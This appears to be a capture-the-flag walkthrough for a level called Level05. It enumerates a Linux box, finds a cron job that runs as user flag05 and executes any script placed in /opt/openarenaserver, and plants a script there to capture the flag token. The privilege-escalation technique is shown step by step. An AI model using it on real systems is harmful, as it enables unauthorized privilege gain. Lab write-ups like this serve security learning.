# Level05 : find flag05

## Tutorial

### 1. Checking `env` variables, groups, files etc.

- command `/usr/bin/env` => `MAIL=/var/mail/level05`
- command `groups` for `level05` user => `level05 users`
- command `ls -l $(find / -user flag05 2> /dev/null)` :
```
-rwxr-x---  1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

### 2. Checking `/var/mail` folder

- command `ls -l /var/mail/` => `-rw-r--r--+ 1 root mail 58 Apr  9 15:59 level05`
- command `cat /var/mail/level05` => `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`, this launches the command `/usr/sbin/openarenaserver` as user `flag05` (`-` is to login) every 1/2 a minute (`*/2 * * * *`)
- Conclusion : we can see that user `flag05` has `r` rights to `/var/mail/level05` (check additionnal explanations) which looks like a cron file. We can't see the cron of user `flag05` (except if `root` or `flag05`)
- Notes : command `cat /etc/crontab`, system-wide crontab, see more in Additional resources

### 3. Checking `/usr/sbin/openarenaserver`

- command `ls -l /usr/sbin/openarenaserver` => `-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver`
- command `cat /usr/sbin/openarenaserver` 
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
 - Conclusion : this cron reads the content of folder `/opt/openarenaserver/` and execute every script with a time limit of 5s, then removes it

### 4. Checking `/opt/openarenaserver/`

- command `ls -l /opt` => `drwxrwxr-x+ 2 root root 40 Apr 10 14:02 openarenaserver`
- Conclusion : we can see that user `level05` has `rwx` permission (check additionnal explanations), we just have to write a script in `/opt/openarenaserver` and check that indeed there is a cron running under user `flag05` (which we can't check because we are user `level05`)

### 5. Write script to get flag05

- script : 
```
/bin/getflag > /tmp/flag05
chmod 777 /tmp/flag05
```
- command `cat /tmp/flag05` => `Check flag.Here is your token : viuaaale9huek52boumoomioc`
- We can see that indeed it worked so there is a cronjob run by `flag05`, job done !

## Additionnal explanations

### 1. Permissions for `/var/mail/level05`

- command `getfacl /var/mail/level05` :
```
# file: var/mail/level05
# owner: root
# group: mail
user::rw-
user:flag05:r--
group::r--
mask::r--
other::r--
```

### 2. Permissions `/usr/sbin/openarenaserver`

- command `getfacl /usr/sbin/openarenaserver` : we can see that user `level05` has `r` permission
```
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

### 3. Permissions `/opt/openarenaserver/` 

- command `getfacl /opt/openarenaserver`
```
# file: opt/openarenaserver
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```

## Additional resources

- bash command
  - http://manpagesfr.free.fr/man/man1/bash.1.html
  - https://ss64.com/bash/ulimit.html
- cron
  - https://www.cyberciti.biz/faq/linux-show-what-cron-jobs-are-setup/
  - https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users
  - https://crontab.guru/every-2-minutes
- su `-c` : `-c` is for launching a command 
  - http://www.linux-france.org/article/man-fr/man1/su-1.html